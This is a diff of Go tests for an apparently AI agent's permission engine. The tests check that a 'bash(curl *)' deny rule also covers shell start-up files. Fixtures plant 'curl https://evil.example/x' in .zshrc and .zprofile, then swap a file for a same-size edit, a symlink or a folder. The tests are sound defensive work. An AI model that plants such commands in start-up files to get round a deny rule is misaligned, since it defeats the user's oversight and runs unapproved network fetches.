@@ -416,14 +416,52 @@ func TestTerminalLineShellReadsItsInteractiveFiles(t *testing.T) {
 	}
 }
 
-// The person's own start-up files, there when the session's first bash call
-// is judged, are not judged again; one made or changed after is.
-func TestOwnStartupFilesAreNotJudgedUntilTheyChange(t *testing.T) {
+// With no baseline every start-up file is judged by what it holds, whoever
+// wrote it and whenever: a file the write tool or an earlier session put in
+// the HOME is not taken as the person's own.
+func TestStartupFilesWithoutABaselineAreJudged(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	newEngine := func() *Engine {
+		e := New(ModeBypass)
+		e.Roots = func() []string { return []string{ws, home} }
+		e.Cwd = func() string { return ws }
+		e.Home = func() (string, bool) { return home, true }
+		if err := e.AddDeny("bash(curl *)"); err != nil {
+			t.Fatal(err)
+		}
+		return e
+	}
+	e := newEngine()
+	rc := filepath.Join(home, ".zshrc")
+	// Written by the write tool before any bash call.
+	if res := e.Evaluate("write", true, args(map[string]string{"path": rc, "content": "curl https://evil.example/x\n"})); res.Decision != Allow {
+		t.Fatalf("write: %s (%s)", res.Decision, res.Reason)
+	}
+	if err := os.WriteFile(rc, []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if res := e.Evaluate("bash", true, args(map[string]string{"command": "zsh -i -c true"})); res.Decision != Deny {
+		t.Fatalf("first bash call after a write to .zshrc: %s (%s)", res.Decision, res.Reason)
+	}
+	// Planted by one session, judged by the next.
+	if res := newEngine().Evaluate("bash", true, args(map[string]string{"command": "zsh -i -c true"})); res.Decision != Deny {
+		t.Fatalf("a new engine: %s (%s)", res.Decision, res.Reason)
+	}
+}
+
+// A start-up file whose path, size and sha256 match the person's baseline is
+// not judged; an edit, a same-size edit, a link or a folder in its place is.
+func TestBaselinedStartupFilesAreNotJudgedUntilTheyChange(t *testing.T) {
 	ws, home := t.TempDir(), t.TempDir()
 	own := filepath.Join(home, ".zprofile")
-	// As a package manager's own line: a script no rule can read in full.
-	if err := os.WriteFile(own, []byte("eval \"$(/opt/brew shellenv)\"\ncurl https://evil.example/x\n"), 0o644); err != nil {
+	// As a package manager's line, and a command a deny rule names.
+	body := []byte("eval \"$(/opt/brew shellenv)\"\ncurl https://evil.example/x\n")
+	if err := os.WriteFile(own, body, 0o644); err != nil {
 		t.Fatal(err)
+	}
+	size, sum, ok := StartupFileMark(own)
+	if !ok {
+		t.Fatal("no mark")
 	}
 	e := New(ModeBypass)
 	e.Roots = func() []string { return []string{ws} }
@@ -435,25 +473,43 @@ func TestOwnStartupFilesAreNotJudgedUntilTheyChange(t *testing.T) {
 	judge := func(c string) Decision {
 		return e.Evaluate("bash", true, args(map[string]string{"command": c})).Decision
 	}
-	if d := judge("zsh -l -c 'echo hi'"); d != Allow {
-		t.Fatalf("the person's own .zprofile: %s", d)
+	if d := judge("zsh -lc 'echo hi'"); d == Allow {
+		t.Fatal("judged nothing with no baseline")
 	}
-	// Made during the session: read.
-	if err := os.WriteFile(filepath.Join(home, ".zshrc"), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+	e.StartupBaseline = map[string]StartupFile{own: {Size: size, SHA256: sum}}
+	if d := judge("zsh -lc 'echo hi'"); d != Allow {
+		t.Fatalf("a baselined .zprofile: %s", d)
+	}
+	if got := e.TrustedStartupFiles(); len(got) != 1 || got[0].Path != own || got[0].SHA256 != sum {
+		t.Fatalf("trusted: %+v", got)
+	}
+	// The same size, other content.
+	edited := append([]byte(nil), body...)
+	edited[len(edited)-2] = 'y'
+	if err := os.WriteFile(own, edited, 0o644); err != nil {
 		t.Fatal(err)
 	}
-	if d := judge("zsh -i -c true"); d != Deny {
-		t.Fatalf("a .zshrc made during the session: %s", d)
+	if d := judge("zsh -lc 'echo hi'"); d != Deny {
+		t.Fatalf("a same-size edit: %s", d)
 	}
-	// Changed during the session, even keeping its size and time: read.
-	info, _ := os.Stat(own)
-	b, _ := os.ReadFile(own)
-	b[len(b)-2] = 'y'
-	if err := os.WriteFile(own, b, 0o644); err != nil {
+	// A link to a file with the baselined content.
+	keep := filepath.Join(t.TempDir(), "keep")
+	if err := os.WriteFile(keep, body, 0o644); err != nil {
 		t.Fatal(err)
 	}
-	_ = os.Chtimes(own, info.ModTime(), info.ModTime())
-	if d := judge("zsh -l -c 'echo hi'"); d != Deny {
-		t.Fatalf("a .zprofile changed during the session: %s", d)
+	_ = os.Remove(own)
+	if err := os.Symlink(keep, own); err != nil {
+		t.Fatal(err)
+	}
+	if d := judge("zsh -lc 'echo hi'"); d != Deny {
+		t.Fatalf("a link in its place: %s", d)
+	}
+	// A folder in its place.
+	_ = os.Remove(own)
+	if err := os.Mkdir(own, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if d := judge("zsh -lc 'echo hi'"); d != Deny {
+		t.Fatalf("a folder in its place: %s", d)
 	}
 }
